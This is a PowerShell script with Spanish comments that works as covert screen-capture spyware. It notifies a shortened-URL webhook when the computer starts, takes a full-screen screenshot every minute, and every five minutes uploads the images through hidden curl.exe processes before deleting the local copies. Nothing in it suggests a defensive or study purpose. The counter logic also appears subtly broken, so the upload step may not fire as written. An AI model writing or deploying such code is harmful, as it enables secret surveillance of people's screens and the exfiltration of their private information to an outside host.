# Define la URL del webhook
$hookurl = "https://bit.ly/web_chupakbras"

# Define el intervalo de tiempo en segundos entre capturas de pantalla
$seconds = 60 # Intervalo de captura de pantalla (1 minuto)

# Define el rango de tiempo en segundos para enviar las imágenes
$sendInterval = 300 # 5 minutos

# Variable para contar las capturas
$counter = 0

# Función para tomar una captura de pantalla
function TakeScreenshot {
    # Crea un objeto Bitmap para la captura de pantalla
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    
    # Guarda la captura de pantalla en un archivo temporal
    $Filett = "$TempFolder\SC$counter.png"
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
    
    # Incrementa el contador
    $counter++
}

# Envía un mensaje al webhook al iniciar Windows
Write-Host "Enviando mensaje al webhook..."
Start-Process -FilePath 'curl.exe' -ArgumentList "-d '{\"message\":\"Computador encendido ($env:COMPUTERNAME)\"}' -H 'Content-Type: application/json' -X POST $hookurl" -NoNewWindow -WindowStyle Hidden

# Obtiene la resolución de la pantalla
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top

# Crea la carpeta temporal para almacenar las capturas
$TempFolder = "$env:temp\Screenshots"
if (-not (Test-Path -Path $TempFolder)) {
    New-Item -ItemType Directory -Path $TempFolder | Out-Null
}

# Realiza la captura de pantalla y envía las capturas
while ($true) {
    # Realiza la captura de pantalla
    TakeScreenshot

    # Si se alcanza el tiempo para enviar las imágenes, envía todas las capturas
    if ($counter -gt 0 -and $counter % ($sendInterval / $seconds) -eq 0) {
        Write-Host "Enviando imágenes..."
        Get-ChildItem -Path $TempFolder -Filter "*.png" | ForEach-Object {
            Start-Process -FilePath 'curl.exe' -ArgumentList "-F 'file1=@$($_.FullName)' $hookurl" -NoNewWindow -WindowStyle Hidden
            Remove-Item -Path $_.FullName -Force
        }
        $counter = 0
    }

    # Espera el tiempo definido antes de tomar la siguiente captura de pantalla
    Start-Sleep $seconds
}
